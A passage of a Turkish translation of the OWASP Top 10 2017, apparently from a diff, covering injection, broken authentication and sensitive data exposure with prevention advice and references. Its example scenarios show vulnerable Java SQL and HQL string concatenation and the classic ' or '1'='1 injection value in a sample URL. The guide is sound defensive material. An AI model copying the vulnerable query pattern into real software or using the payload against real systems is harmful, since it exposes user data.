kodlama olmaksızın güvenilmeyen veriyi yeni bir web sayfası içerisinde gösterdiğinde veya kullanıcı tarafından sağlanan bir girdi ile HTML veya JavaScript üretebilen bir tarayıcı API'sini kullanarak mevcut sayfayı güncellediğinde ortaya çıkmaktadır. XSS saldırganların, kurbanın tarayıcısında kullanıcı oturumlarını ele geçirebilen, web sayfalarının bütünlüğünü bozabilen veya kullanıcıyı zararlı sitelere yönlendirebilen betikler çalıştırabilmesine izin vermektedir. | | A8:2017-Güvensiz Ters Serileştirme | Güvensiz ters serileştirme genellikle uzaktan kod çalıştırmaya yol açmaktadır. Ters serileştirme açıklıkları uzaktan kod çalıştırma ile sonuçlanmasa da, tekrar saldırısı, enjeksiyon saldırıları ve yetki yükseltme saldırıları gibi saldırıları gerçekleştirmek için kullanılabilmektedir. | | A9:2017-Bilinen Açıklık İçeren Bileşen Kullanımı | Kütüphaneler, çerçeve yazılımlar ve diğer yazılım modülleri gibi bileşenler uygulamanın sahip olduğu yetkiler ile çalışmaktadır. Eğer açıklık içeren bir bileşen istismar edilirse, böyle bir saldırı ciddi veri kayıplarına veya sunucunun ele geçirilmesine yol açabilmektedir. Bilinen açıklık içeren bileşenleri kullanan uygulamalar ve API'ler uygulamanın sahip olduğu savunma mekanizmalarına zarar verebilmekte ve farklı saldırılara ve etkilere neden olabilmektedir. | | A10:2017-Yetersiz Loglama &amp; İzleme | Yetersiz loglama ve izleme, olay müdahelesi ile eksik veya etkisiz entegresyan ile birleştiğinde saldırganların sistemlere saldırmasına, devamlılık sağlamasına, başka sistemlere sıçramasına ve veriyi değiştirmesine, ele geçirmesine veya ortadan kaldırmasına izin vermektedir. Çoğu ihlal incelemeleri, bir ihlalin tespiti için gereken sürenin 200 günden fazla olduğunu ve genellikle iç süreçler veya izleme yerine dış kaynaklar tarafından tespit edildiğini göstermektedir. |</p>
+<h1 id="a12017-enjeksiyon">A1:2017 Enjeksiyon</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit Etkenleri/Saldırı Vektörleri</th>
+<th>Güvenlik Zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 3</td>
+<td>Yaygınlık 2 : Tespit Edilebilirlik 3</td>
+<td>Teknik 3 : İş</td>
+</tr>
+<tr class="even">
+<td>Neredeyse tüm veri kaynakları (çevresel değişkenler, parametreler, iç ve dış web servisleri ve tüm kullanıcı türleri) bir enjeksiyon vektörü olabilmektedir. <a href="https://owasp.org/www-community/Injection_Flaws">Enjeksiyon açıklıkları</a> saldırgan zararlı bir veriyi yorumlayıcıya gönderdiğinde ortaya çıkmaktadır.</td>
+<td>Enjeksiyon açıklıkları eski kodlarda başta olmak üzere son derece yaygındır. Enjeksiyon açıklıkları genellikle SQL, LDAP, XPath veya NoSQL sorgularında, OS komutlarında, XML ayrıştırıcılarında, SMTP başlıklarında, programlama dillerinde ve ORM sorgularında görülmektedir. Enjeksiyon açıklıkları kaynak kod incelenirken kolaylıkla tespit edilebilmektedir. Tarama ve fuzzer araçları saldırganların enjeksiyon açıklıklarını bulmalarına yardımcı olabilmektedir.</td>
+<td>Enjeksiyon saldırıları verilerin kaybedilmesi, bozulması veya yetkisiz kimselere sızdırılması, inkar edilememezliğin yitirilmesi veya servis dışı bırakma saldırıları ile sonuçlanabilmektedir. Enjeksiyon saldırıları bazı durumlarda sunucunun tamamen ele geçirilebilmesine yol açmaktadır. İş etkisi uygulamanın ihtiyaçlarına ve sahip olduğu veriye göre değişmektedir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklığı-i̇çeriyor-mu">Uygulamam Açıklığı İçeriyor Mu?</h2>
+<p>Aşağıdaki durumlarda, bir uygulamanın ilgili açıklığı içerdiği söylenebilir:</p>
+<ul>
+<li>Kullanıcı tarafından sağlanan girdiler uygulama tarafından doğrulanmadığında, filtrelenmediğinde veya sterilize edilmediğinde.</li>
+<li>Kullanıldığı bağlama göre sterilize edilmeden yapılan ve parametrik olmayan veya dinamik olan sorgular doğrudan yorumlayıcı tarafından kullanıldığında.</li>
+<li>Zararlı veri hassas kayıtları getirmek için ORM arama parametreleri arasında kullanıldığında.</li>
+<li>Zararlı veri SQL OR komutu ile dinamik sorgularda, komutlarda veya saklı yordamlarda normal yapının zararlı veri ile birleştirilebileceği bir şekilde doğrudan kullanıldığında.</li>
+<li>En yaygın enjeksiyon saldırıları SQL, NoSQL, OS komut, ORM, LDAP, EL veya OGNL enjeksiyonlarıdır. Saldırının mantığı tüm yorumlayıcılar için aynıdır. Kaynak kod analizi uygulamanın enjeksiyon açıklıkları içerip içermediğini anlamak için en iyi yöntemdir. Kaynak kod analizi sonrasında veya sırasında, eksiksiz bir şekilde tüm parametreler, başlıklar, URL'ler, çerezler, JSON verileri, SOAP mesajları ve XML veri girdileri otomatize olarak test edilmelidir. Kurumlar statik kaynak kod analizi (<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>) ve dinamik uygulama güvenliği testi araçlarını (<a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a>) CI/CD süreçleri içerisinde yeni çıkan enjeksiyon açıklıklarını kurulumdan önce tespit etmek için kullanabilirler.</li>
+</ul>
+<h2 id="nasıl-önlenir">Nasıl Önlenir</h2>
+<p>Enjeksiyon saldırılarını önlemek verinin komutlardan ve sorgulardan uzak tutulmasını gerektirmektedir.</p>
+<ul>
+<li>Tercih edilen yöntem, yorumlayıcı kullanımından tamamen kaçınan veya parametrik bir arayüz sunan veya ORM araçları kullanan güvenli bir API kullanımıdır. <strong>Not</strong>: Parametrik olsa bile, eğer PL/SQL veya T-SQL veri ile sorguları birleştiriyorsa veya zararlı veriyi EXECUTE IMMEDIATE veya exec() ile çalıştırıyorsa, saklı yordamlar hala SQL enjeksiyonu açıklığına neden olabilmektedir.</li>
+<li>Sunucu taraflı "beyaz liste" girdi denetimi yapılmalıdır. Metin alanları veya mobil uygulama API'leri gibi pek çok uygulama özel karakterler gerektirdiği için bu kesin bir çözüm değildir.</li>
+<li>Herhangi bir şekilde yukarıdaki çözümlerin uygulanamadığı diğer dinamik sorgular için, yorumlayıcıya özel sterilize yöntemleri belirlenerek özel karakterler sterilize edilmelidir. <strong>Not</strong>: Tablo adı, sütun adı gibi SQL yapıları sterilize edilemez, bu yüzden kullanıcı tarafından sağlanan yapısal isimler tehlikeli olmaktadır. Bu durum rapor üreten yazılımlar için yaygın bir problemdir.</li>
+<li>Sorgular içerisinde LIMIT ve benzeri kontroller kullanılarak, SQL enjeksiyonu durumunda büyük miktarlarda verinin sızdırılması engellenmelidir.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryosu">Örnek Saldırı Senaryosu</h2>
+<p><strong>Senaryo #1</strong>: Bir uygulama, aşağıdaki zafiyet içeren SQL çağrısını oluştururken güvenilmeyen bir veri kullanmaktadır.</p>
+<p><code>String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";</code></p>
+<p><strong>Senaryo #2</strong>: Benzer şekilde, bir uygulamanın kullanılan çerçeve yazılımlara olan kayıtsız güveni de bu uygulamaları saldırılara açık bırakmaktadır. (örn. Hibernate Sorgu Dili (HQL))</p>
+<p><code>Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</code></p>
+<p>Her iki durumda da, saldırgan id parametresinin değerini ' or '1'='1 olarak tarayıcısı üzerinden değiştirmektedir. Örneğin:</p>
+<p><code>https://example.com/app/accountView?id=' or '1'='1</code></p>
+<p>Bu değer, her iki sorgunun da anlamını değiştirmekte ve tablodaki tüm kayıtları döndürmektedir. Daha tehlikeli saldırılar veriyi değiştirebilir veya silebilir, hatta saklı yordamları çalıştırabilir.</p>
+<h2 id="kaynaklar-1">Kaynaklar</h2>
+<h3 id="owasp-1">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c3-secure-database">OWASP Proaktif Kontroller: Parametrik Sorgular</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md">OWASP ASVS: V5 Girdi Doğrulama ve Kodlama</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP Test Rehberi: SQL Enjeksiyonu</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">Komut Enjeksiyonu</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection">ORM enjeksiyonu</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: Enjeksiyon Önlemleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: SQL Enjeksiyonu Önlemleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html_in_Java">OWASP Kopya Kağıdı: Java için Enjeksiyon Önlemleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">OWASP Kopya Kağıdı: Parametrik Sorgular</a></li>
+<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">OWASP Web Uygulamaları için Otomatize Tehditler – OAT-014</a></li>
+</ul>
+<h3 id="dış-kaynaklar-1">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564: Hibernate Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917: Expression Language Injection</a></li>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger: Server-side template injection</a></li>
+</ul>
+<h1 id="a22017-yetersiz-kimlik-doğrulama">A2:2017 Yetersiz Kimlik Doğrulama</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit Etkenleri/Sadlırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 3</td>
+<td>Yaygınlık 2 : Tespit Edilebilirlik 2</td>
+<td>Teknik 3 : İş</td>
+</tr>
+<tr class="even">
+<td>Saldırganlar yüz milyonlarca geçerli kullanıcı adı ve parola kombinasyonlarına, varsayılan yönetici hesap listelerine, otomatize kaba kuvvet ve sözlük saldırısı araçlarına sahiptir. Oturum yönetimi saldırıları, özellikle süresi dolmayan oturum anahtarları ile yapılan saldırılar, iyi bilinmektedir.</td>
+<td>Yetersiz kimlik doğrulama açıklıkları, pek çok kimlik ve erişim kontrollerinin tasarım ve uygulamasından dolayı son derece yaygındır. Oturum yönetimi kimlik doğrulamanın ve erişim kontrollerinin temel taşıdır ve durum tutan tüm uygulamalarda bulunmaktadır. Saldırganlar yetersiz kimlik doğrulama açıklıklarını kendileri tespit edebilmekte ve parola listeleri içeren otomatize araçları ve sözlük saldırılarını kullanarak bunları istismar etmektedirler.</td>
+<td>Saldırganlar sistemi ele geçirmek için sadece birkaç hesaba veya bir tane yönetici hesabına erişmek zorundadır. Uygulamanın alanına bağlı olarak bu durum kara para aklamaya, sosyal güvenlik dolandırıcılığına ve kimlik hırsızlığına izin verebilir veya son derece hassas olan ve yasal olarak korunan bilgileri ifşa edebilir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklığı-i̇çeriyor-mu-1">Uygulamam Açıklığı İçeriyor Mu?</h2>
+<p>Kullanıcının kimliğinin onaylanması, kimlik doğrulama ve oturum yönetimi kimlik doğrulama ile ilgili saldırılara karşı korunmak için son derece büyük önem taşımaktadır.</p>
+<p>Uygulama aşağıdaki durumlarda kimlik doğrulama açıklıkları içeriyor olabilir:</p>
+<ul>
+<li>Saldırganın geçerli kullanıcı adı ve parola listesine sahip olduğu <a href="https://owasp.org/www-community/attacks/Credential_stuffing">sözlük saldırıları</a> gibi otomatize saldırılara izin veriyorsa.</li>
+<li>Kaba kuvvet veya diğer otomatize saldırılara izin veriyorsa.</li>
+<li>"Password1" veya "admin/admin" gibi varsayılan, zayıf veya herkesçe bilinen parolalara izin veriyorsa.</li>
+<li>Güvenli olması mümkün olmayan "güvenlik soruları" gibi zayıf veya etkisiz hesap kurtarma ve unutulan parola süreçleri kullanıyorsa.</li>
+<li>Açık metin, şifrelenmiş veya zayıf bir şekilde özeti alınmış parolalar kullanıyorsa (Bakınız <strong>A3:2017-Hassas Bilgi İfşası</strong>).</li>
+<li>Eksik veya etkisiz çok katmanlı kimlik doğrulamaya sahipse.</li>
+<li>Oturum ID değerlerini URL üzerinden taşıyorsa (örn. URL'i yeniden yazma).</li>
+<li>Başarılı giriş sonrası oturum ID değerlerini değiştirmiyorsa.</li>
+<li>Oturum ID değerlerini doğru bir şekilde sonlandırmıyorsa. Çıkış veya hareketsizlik durumunda kullanıcı oturumları veya kimlik doğrulama anahtarları (özellikle tek oturum açma(SSO) anahtarları) düzgün bir şekilde sonlandırılmıyorsa.</li>
+</ul>
+<h2 id="nasıl-önlenir-1">Nasıl Önlenir</h2>
+<ul>
+<li>Otomatize saldırıları, sözlük saldırılarını, kaba kuvvet saldırılarını ve çalınan giriş bilgilerinin tekrar kullanılmasını önlemek için mümkün olduğunca çok katmanlı kimlik doğrulama uygulanmalıdır.</li>
+<li>Özellikle yönetici kullanıcıları için herhangi bir varsayılan giriş bilgisi kullanılmamalı veya bu şekilde kullanıma sunulmamalıdır.</li>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">En kötü 10000 parola</a> gibi bir listeye karşı yeni veya değiştirilmiş parolaları kıyaslamak gibi zayıf parola kontrolleri uygulanmalıdır.</li>
+<li>Parola uzunluğu, karmaşıklığı ve değiştirme politikaları, <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63 B's guidelines in section 5.1.1 for Memorized Secrets</a> veya diğer modern, kanıta dayalı parola politikalarına göre belirlenmelidir.</li>
+<li>Tüm sonuçlar için aynı mesaj kullanılarak, kayıt yapma, hesap kurtarma ve API yolları geçerli hesapları toplama saldırılarına karşı güçlendirilmelidir.</li>
+<li>Başarısız giriş denemeleri sınırlandırılmalı veya artarak geciktirilmelidir. Tüm başarısız denemeler loglanmalı ve sözlük saldırıları, kaba kuvvet saldırıları veya diğer saldırılar tespit edildiğinde yöneticiler uyarılmalıdır.</li>
+<li>Giriş yapıldıktan sonra yeni bir rastgele oturum ID değeri üreten ve büyük bir entropiye sahip olan sunucu taraflı, güvenli ve gömülü bir oturum yöneticisi kullanılmalıdır. Oturum ID değerleri URL üzerinde olmamalı, güvenli bir şekilde saklanmalı ve çıkış yapıldıktan, belirli bir süre hareketsiz kaldıktan ve geçerlilik süresi dolduktan sonra sonlandırılmalıdır.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryoları">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: <a href="https://owasp.org/www-community/attacks/Credential_stuffing">Sözlük saldırıları</a> ve <a href="https://github.com/danielmiessler/SecLists">bilinen parola listelerinin</a> kullanımı yaygın saldırılardır. Eğer bir uygulama otomatize tehdit veya sözlük saldırısı koruması içermiyorsa, uygulama geçerli giriş bilgilerinin toplanması için kullanılabilir.</p>
+<p><strong>Senaryo #2</strong>: Pek çok kimlik doğrulama saldırısı sadece parolaların sürekli kullanımından kaynaklanmaktadır. En iyi uygulama örnekleri düşünüldüğünde, parola değiştirme ve karmaşıklık gereksinimleri, kullanıcıların zayıf parolaları kullanmaları ve bunları tekrar tekrar kullanmaları konusunda teşvik edici olarak görülmektedir. Kurumların NIST 800-63 uyarınca bu uygulamaları durdurması ve çok katmanlı kimlik doğrulama kullanması tavsiye edilmektedir.</p>
+<p><strong>Senaryo #3</strong>: Uygulama oturum zaman aşımları düzgün bir şekilde belirlenmemiştir. Bir kullanıcı uygulamaya erişmek için herkes tarafından erişilebilir bir bilgisayar kullanmaktadır. Kullanıcı "çıkış yap" seçeneğini kullanmak yerine, tarayıcı sekmesini kapatmış ve oradan uzaklaşmıştır. Bu durumda, saldırgan bir saat sonra aynı tarayıcıyı kullandığında kullanıcının hala kimlik doğrulaması yapılmış olacaktır.</p>
+<h2 id="kaynaklar-2">Kaynaklar</h2>
+<h3 id="owasp-2">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c6-digital-identity">OWASP Proaktif Kontroller: Kimlik ve Kimlik Doğrulama Kontrollerinin Uygulanması</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Uygulama Güvenliği Doğrulama Standardı: V2 Kimlik Doğrulama</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Uygulama Güvenliği Doğrulama Standardı: V3 Oturum Yönetimi</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README">OWASP Test Rehberi: Kimlik</a> ve <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README">Kimlik Doğrulama</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP Kopya Kağıdı: Kimlik Doğrulama</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: Sözlük Saldırıları</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html">OWASP Kopya Kağıdı: Unutulmuş Parola</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">OWASP Kopya Kağıdı: Oturum Yönetimi</a></li>
+<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">OWASP Otomatize Tehditler El Kitabı</a></li>
+</ul>
+<h3 id="dış-kaynaklar-2">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63b: 5.1.1 Memorized Secrets</a> - kimlik doğrulama hakkında tam, modern ve kanıta dayalı tavsiyeler için.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
+</ul>
+<h1 id="a32017-hassas-bilgi-i̇fşası">A3:2017 Hassas Bilgi İfşası</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim düzeyi : İstismar Edilebilirlik 2</td>
+<td>Yaygınlık 3 : Tespit Edilebilirlik 2</td>
+<td>Teknik 3 : İş</td>
+</tr>
+<tr class="even">
+<td>Doğrudan şifrelemeye saldırmak yerine saldırganlar anahtarları çalmakta, ortadaki adam saldırıları gerçekleştirmekte veya sunucudan transit halindeyken veya istemcinin tarayıcısından açık metin verileri çalmaktadır. Genellikle, elle yapılacak bir saldırı gerekmektedir. Daha önceden elde edilen parola veri tabanları grafik işleme üniteleri (GPU) tarafından kaba kuvvet saldırısında kullanılmaktadır.</td>
+<td>Son birkaç yıldır, bu açıklık ciddi etkileri olan en yaygın saldırılara neden olmuştur. En yaygın açıklık hassas verinin şifrelenmemesidir. Şifreleme uygulandığında, özellikle zayıf parola özeti ile saklama yöntemleri için zayıf anahtar üretimi ve yönetimi, zayıf algoritma, protokol ve anahtar kullanımı yaygındır. Veri transit halindeyken, sunucu taraflı açıklıkların tespit edilmesi kolaydır, ancak durağan veri için tespit zor olmaktadır.</td>
+<td>Eksiklikler sıklıkla korunması gereken tüm veriyi tehlikeye atmaktadır. Genellikle, bu veriler AB GDPR veya yerel gizlilik kanunları gibi yasalarda veya düzenlenmelerde tanımlandığı gibi koruma gerektiren kredi kartı numarası, kişisel veriler, giriş bilgileri, sağlık kayıtları gibi hassas kişisel bilgileri (PII) içermektedir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklık-i̇çeriyor-mu">Uygulamam Açıklık İçeriyor Mu?</h2>
+<p>Yapılacak ilk şey transit ve durağan veri için koruma gereksinimlerinin belirlenmesidir. Örneğin, parolalar, kredi kartı numaraları, sağlık kayıtları, kişisel bilgiler ve iş sırları, özellikle veri AB Genel Veri Koruma Tüzüğü (GDPR) gibi yasalar veya PCI Veri Güvenliği Standardı (PCI DSS) gibi finansal veri koruma düzenlemeleri tarafından korunuyorsa, ilave koruma önlemleri gerektirmektedir. Bu kapsamdaki tüm veriler için:</p>
+<ul>
+<li>Herhangi bir veri açık metin olarak iletiliyor mu? Bu HTTP, SMTP ve FTP gibi protokolleri ilgilendirmektedir. Özellikle dış internet trafiği tehlike taşımaktadır. Tüm iç trafik örn. yük dengeleyiciler, web sunucuları veya arka uç sistemleri arasındaki trafik, doğrulanmalıdır.</li>
+<li>Varsayılan olarak ve eski kod içerisinde herhangi bir eski veya zayıf kriptografik algoritma kullanılmakta mı?</li>
+<li>Varsayılan kripto anahtarları kullanılmakta mı, zayıf kripto anahtarları üretilmekte veya tekrar kullanılmakta mı? Yeterli anahtar yönetimi veya değişimi bulunmakta mı?</li>
+<li>Şifreleme zorunlu tutuluyor mu? örn. herhangi bir tarayıcı güvenlik direktifi veya başlığı eksik mi?</li>
+<li>Kullanıcı aracısı (örn. uygulama, mail istemcisi) alınan sunucu sertifikasının geçerli olup olmadığını doğruluyor mu?</li>
+</ul>
+<p>Bakınız ASVS <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x14-V6-Cryptography.md">Şifreleme (V7)</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x16-V8-Data-Protection.md">Veri Koruma (V9)</a> ve <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x17-V9-Communications.md">SSL/TLS (V9)</a>.</p>
+<h2 id="nasıl-önlenir-2">Nasıl Önlenir</h2>
+<p>En azından aşağıdakiler yapılmalı ve referanslara başvurulmalıdır:</p>
+<ul>
+<li>Bir uygulama tarafından işlenen, saklanılan veya iletilen veri sınıflandırılmalıdır. Gizlilik kanunlarına, yasal gereksinimlere ve iş ihtiyaçlarına göre hassas olan veriler belirlenmelidir.</li>
+<li>Her bir sınıflandırma için kontroller uygulanmalıdır.</li>
+<li>Gerek duyulmayacaksa hassas veriler saklanmamalıdır. Mümkün olduğunca erken bir şekilde hassas veri elden çıkarılmalı veya PCI DSS standardına uygun bir şekilde dizgeciklendirilmeli veya silinmelidir. Saklanmayan veri çalınamaz.</li>
+<li>Durağan tüm hassas verilerin şifrelendiğinden emin olunmalıdır.</li>
+<li>Güncel ve güçlü algortimaların, protokollerin ve anahtarların kullanıldığından emin olunmalıdır. Düzgün bir anahtar yönetimi yapılmalıdır.</li>
+<li>Mükemmel iletme gizliliği (PFS) şifreleri, sunucu tarafından şifre önceliklendirmesi ve güvenli parametreler ile TLS protokolü gibi güvenli protokoller ile tüm veriler transit haldeyken şifrelenmelidir.</li>
+<li>Hassas veriler içeren cevapların önbelleğe alınması engellenmelidir.</li>
+<li>Parolaları <a href="https://github.com/p-h-c/phc-winner-argon2">Argon2</a>, <a href="https://wikipedia.org/wiki/Scrypt">scrypt</a>, <a href="https://wikipedia.org/wiki/Bcrypt">bcrypt</a> veya <a href="https://wikipedia.org/wiki/PBKDF2">PBKDF2</a> gibi güçlü, adaptif ve tuzlama kullanan özet fonksiyonları ile saklayınız.</li>
+<li>Birbirinden bağımsız olarak yapılandırmanın ve ayarların etkinliği tespit edilmelidir.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryoları-1">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Bir uygulama kredi kartı numaralarını otomatik veri tabanı şifrelemesini kullanarak bir veri tabanında tutmaktadır. Ancak, bu veri, veri tabanından alınırken otomatik olarak çözülmektedir ve bu da bir SQL enjeksiyonu açıklığı sayesinde kredi kartı numaralarının açık metin olarak alınmasına izin vermektedir.</p>
+<p><strong>Senaryo #2</strong>: Bir site tüm sayfaları için TLS protokolünü zorunlu tutmamaktadır veya zayıf şifrelemeyi desteklemektedir. Bir saldırgan ağ trafiğini dinlemekte (örn. güvensiz bir kablosuz ağda), bağlantıları HTTPS'den HTTP'e düşürmekte, isteklerde araya girmekte ve kullanıcının oturum çerezini çalmaktadır. Saldırgan daha sonra bu çerezi tekrar yollamakta ve kullanıcının (kimliği doğrulanmış) oturumunu çalmakta, kullanıcının kişisel verisine erişmekte ve bunu değiştirmektedir. Bunların yerine, bir para transferindeki alıcı ismi gibi iletilen veriyi de değiştirebilmektedir.</p>
+<p><strong>Senaryo #3</strong>: Bir parola veri tabanı, kullanıcıların parolalarını saklamak için tuzlanmamış veya basit özet fonksiyonlarını kullanmaktadır. Bir dosya yükleme açıklığı saldırganın parola veri tabanına ulaşmasını sağlamaktadır. Tuzlanmamış tüm özetler, önceden hesaplanmış özetler ile yapılan bir kaba kuvvet saldırısı sonucu çözülebilmektedir. Basit veya hızlı özet fonksiyonları tarafından üretilen özetler, tuzlanmış olsalar bile GPU'lar tarafından kırılabilmektedir.</p>
+<h2 id="kaynaklar-3">Kaynaklar</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c8-protect-data-everywhere">OWASP Proaktif Kontroller: Verinin Korunması</a></li>
+<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Uygulama Güvenliği Doğrulama Standardı</a>: <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x14-V6-Cryptography.md">V6</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x16-V8-Data-Protection.md">9</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x17-V9-Communications.md">10</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">OWASP Kopya Kağıdı: Taşıma Katmanı Korumaları</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/User_Privacy_Protection_Cheat_Sheet.html">OWASP Kopya Kağıdı: Kullanıcı Gizliliğinin Korunması</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">OWASP Kopya Kağıdı: Parola</a> ve <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html">Kriptografik Saklama</a></li>
+<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Güvenlik Başlıkları Projesi</a>; <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html">Kopya Kağıdı: HSTS</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README">OWASP Test Rehberi: Zayıf kriptografi testleri</a></li>
+</ul>
+<h3 id="dış-kaynaklar-3">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/220.html">CWE-220: Exposure of sens. information through data queries</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/310.html">CWE-310: Cryptographic Issues</a>; <a href="https://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312: Cleartext Storage of Sensitive Information</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Weak Encryption</a>; <a href="https://cwe.mitre.org/data/definitions/327.html">CWE-327: Broken/Risky Crypto</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/359.html">CWE-359: Exposure of Private Information - Privacy Violation</a></li>
+</ul>
+<h1 id="a42017-xml-dış-varlıkları-xxe">A4:2017 XML Dış Varlıkları (XXE)</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit Etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 2</td>
+<td>Yaygınlık 2 : Tespit Edilebilirlik 3</td>
+<td>Teknik 3 : İş</td>
+</tr>
+<tr class="even">
+<td>Saldırganlar, eğer XML dosyası yükleyebiliyorsa veya bir XML dokümanı içerisine zararlı bir içerik ekleyebiliyorsa, zafiyet içeren kodları, bağımlılıkları veya entegrasyonları istismar edecek şekilde XML işleyicilerini istismar edebilmektedir.</td>
